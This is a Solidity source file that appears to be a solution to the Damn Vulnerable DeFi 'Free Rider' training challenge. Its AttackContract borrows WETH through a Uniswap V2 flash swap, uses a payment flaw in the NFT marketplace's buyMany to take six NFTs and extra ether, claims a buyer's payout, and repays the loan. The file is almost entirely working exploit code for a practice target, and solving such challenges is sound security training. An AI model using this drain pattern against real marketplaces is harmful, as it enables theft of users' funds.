// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderBuyer} from "./FreeRiderBuyer.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "./Interfaces.sol";
import {WETH9} from "../WETH9.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract AttackContract {
    FreeRiderNFTMarketplace public freeRiderNFTMarketplace;
    IUniswapV2Pair public uniswapV2Pair;
    FreeRiderBuyer public freeRiderBuyer;
    DamnValuableNFT public damnValuableNFT;
    WETH9 public weth;
    uint256[] public tokenIds;

    constructor(
        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
        IUniswapV2Pair _uniswapV2Pair,
        WETH9 _weth,
        FreeRiderBuyer _freeRiderBuyer,
        DamnValuableNFT _damnValuableNFT
        ) {
        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        uniswapV2Pair = _uniswapV2Pair;
        weth = _weth;
        freeRiderBuyer = _freeRiderBuyer;
        damnValuableNFT = _damnValuableNFT;
    }

    function flashSwap() external {
        // This is a Uniswap V2 DVD/WETH pool
        // Flash swap for 15 WETH
        uniswapV2Pair.swap(0, 15 ether, address(this), bytes("1337"));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        console.log("Flash swap received! Current WETH balance of attackContract: ", weth.balanceOf(address(this)) / 10**18, "WETH");
        console.log("Swapping 15 WETH to 15 ETH.");
        weth.withdraw(15 ether);

        // Pay 15 ether, receive 6 NFT and get paid 90 ether
        for (uint256 i; i < 6; i++) {
            tokenIds.push(i);
        }
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
        console.log("ETH balance of attackContract after buyMany(): ", address(this).balance / 10**18, "ETH");
        
        // Send all NFTs to the buyer and get the payout
        for (uint256 i; i < 6; i++) {
            console.log("Sending NFT to the buyer: ", i);
            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i, "");
        }
        console.log("ETH balance of attackContract in the end: ", address(this).balance / 10**18, "ETH");

        // Repay flash swap
        console.log("Swapping 16 ETH to 16 WETH in order to payback flash swap.");
        console.log("Repaying flash swap.");
        weth.deposit{value: 16 ether}();
        weth.transfer(address(uniswapV2Pair), 16 ether);
        console.log("Flash swap successfully repaid.");
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
        console.log("Sending NFT to the buyer to get job payout.");
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
        console.log("ETH received! Current ETH balance of attackContract: ", address(this).balance / 10**18, "ETH");
    }
}